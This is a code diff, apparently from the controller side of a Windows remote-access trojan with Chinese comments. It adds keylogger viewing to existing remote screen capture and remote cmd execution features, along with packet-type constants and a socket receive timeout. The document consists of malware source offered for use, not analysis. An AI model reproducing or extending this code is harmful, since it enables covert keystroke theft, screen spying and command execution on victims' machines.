@@ -8,10 +8,17 @@
 
 //宏定义
 
+//cmd包
+#define TO_CLIENT_CMD		10001
+#define GET_CLIENT_CMD		10002
+
 //屏幕包
 #define	TO_CLIENT_SCREEN	20001
 #define GET_CLIENT_SCREEN	20002
 
+
+//键盘包
+#define TO_CLIENT_KEY		30001
 
 
 //包结构
@@ -52,6 +59,9 @@ struct ClientData
 	HWND		hCmdWindow;		//Cmd窗口句柄
 	HANDLE		hCmdThread;		//Cmd显示线程句柄
 
+	HWND		hKeyWindow;		//键盘记录窗口句柄
+	HANDLE		hKeyThread;		//显示键盘记录线程句柄
+
 	ClientData* Next;			//指向下一个ClientData结构
 };
 
@@ -67,8 +77,8 @@ SOCKET hSocketWait;				//用于等待客户端连接的套接字句柄
 
 
 
-
-
+BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
+BOOL _stdcall _ShowKey(_Show* lpScreen);
 BOOL _stdcall _CheckClient();
 VOID _stdcall _InitSocket();
 BOOL _stdcall _ToClient(_Show* lpScreen);
@@ -109,8 +119,12 @@ BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 		case ID_40001:				//显示截屏
 			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG2), NULL, _DialogScreen, lo.iItem);
 			break;
-		case ID_40003:
+		case ID_40002:				//显示键盘记录
+			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG4), NULL, _DialogKey, lo.iItem);
+			break;
+		case ID_40003:				//显示cmd
 			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG3), NULL, _DialogCmd, lo.iItem);
+			break;
 		}
 		break;
 	case WM_NOTIFY:
@@ -234,8 +248,8 @@ BOOL _stdcall _ReceiveClient()
 		memset(&remoteAddr, 0, sizeof(remoteAddr));
 		remoteAddr.sin_family = AF_INET;
 		SOCKET h = accept(hSocketWait, (sockaddr*)&remoteAddr, &nLen);				//等待客户端连接
-
-
+		
+		
 
 		i = 1;												//增加一个客户端数据结构
 		pClient = pHandClient;
@@ -319,16 +333,16 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 	{
 
 		len = 0;
-		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
-
+		int timeout;
+		timeout = 1000 * 60; //60秒超时recv返回		
+		setsockopt(pClient->hSocketClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(int));
 
 		//接收来自客户端的数据(循环接收)
-	
-
 		memset(szBuffer, 0, sizeof(szBuffer));
 		while (1)
 		{
-
+			
+			
 			len = recv(pClient->hSocketClient, (char*)(szBuffer + len), 8 - len, 0);
 			if (len <= 0)							//recv错误
 			{
@@ -338,10 +352,12 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 			if (len == 8)
 				break;
 		}
+		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
 		if (flag == 1)		//如果recv出错,断开连接结束线程
 		{
 			SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//关闭屏幕显示窗口和线程
 			SendMessage(pClient->hCmdWindow, WM_CLOSE, 0, 0);									//关闭cmd窗口
+			SendMessage(pClient->hKeyWindow, WM_CLOSE, 0, 0);									//关闭键盘窗口
 
 																							//删除客户端数据链中相应的客户端
 			pClient = pHandClient;
@@ -466,7 +482,7 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 				{
 					GetDlgItemText(hWnd, IDC_EDIT2, szBuffer, sizeof(szBuffer));
 
-					stSendWrap.dwType = 10002;
+					stSendWrap.dwType = GET_CLIENT_CMD;
 					stSendWrap.dwLength = lstrlen(szBuffer);
 					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
 					send(pClient->hSocketClient, (char*)&stSendWrap, 8,0);				//请求执行cmd
@@ -488,7 +504,7 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 			{
 				TerminateThread(pClient->hCmdThread, 0);
 				CloseHandle(pClient->hCmdThread);
-
+				
 			}
 			pClient = pClient->Next;
 		}
@@ -512,6 +528,46 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
 
 
+//显示键盘记录窗口(窗口回调)
+BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+
+	ClientData* pClient = pHandClient;		//辅助指针
+
+	switch (message)
+	{
+
+	case WM_CLOSE:										//关闭显示屏幕线程
+		pClient = pHandClient;
+		while (pClient != NULL)
+		{
+			if (pClient->hScreenWindow == hWnd)
+			{
+				TerminateThread(pClient->hKeyThread, 0);
+				CloseHandle(pClient->hKeyThread);
+			}
+			pClient = pClient->Next;
+		}
+		EndDialog(hWnd, 0);
+
+		break;
+	case WM_INITDIALOG:
+
+		for (int i = 0;i < lParam; i++)		//保存对应屏幕窗口信息
+			pClient = pClient->Next;
+
+		pClient->stShow.hWnd = hWnd;
+		pClient->stShow.dwItem = lParam;
+
+		pClient->hKeyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ShowKey, &pClient->stShow, 0, NULL);
+		pClient->hKeyWindow = hWnd;
+
+		break;
+	default:
+		return FALSE;
+	}
+	return TRUE;
+}
 
 
 //显示截屏
@@ -546,8 +602,7 @@ BOOL _stdcall _ShowScreen(_Show* lpScreen)
 	while (1)
 	{
 		
-		/*if (pClient == NULL)
-			break;*/
+		
 		if (pClient->stWrap.dwType == TO_CLIENT_SCREEN)			//显示屏幕包
 		{
 
@@ -600,7 +655,7 @@ BOOL _stdcall _ShowCmd(_Show* lpScreen)
 	while (1)
 	{
 
-		if (pClient->stWrap.dwType == 10001)			//显示cmd
+		if (pClient->stWrap.dwType == TO_CLIENT_CMD)			//显示cmd
 		{
 			WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
 			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//最加写cmd数据
@@ -614,3 +669,28 @@ BOOL _stdcall _ShowCmd(_Show* lpScreen)
 }
 
 
+//显示键盘记录
+BOOL _stdcall _ShowKey(_Show* lpScreen)
+{
+	ClientData* pClient = pHandClient;		//辅助指针
+	for (int i = 0;i < lpScreen->dwItem; i++)
+	{
+		pClient = pClient->Next;
+	}
+
+	while (1)
+	{
+
+
+		if (pClient->stWrap.dwType == TO_CLIENT_KEY)				//显示键盘包
+		{
+			WaitForSingleObject(pClient->hmutex, INFINITE);//请求互斥对象
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//最加写键盘记录数据
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT1), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
+			ReleaseMutex(pClient->hmutex);				  //释放互斥对象句柄
+
+		}
+
+	}
+	return 0;
+}
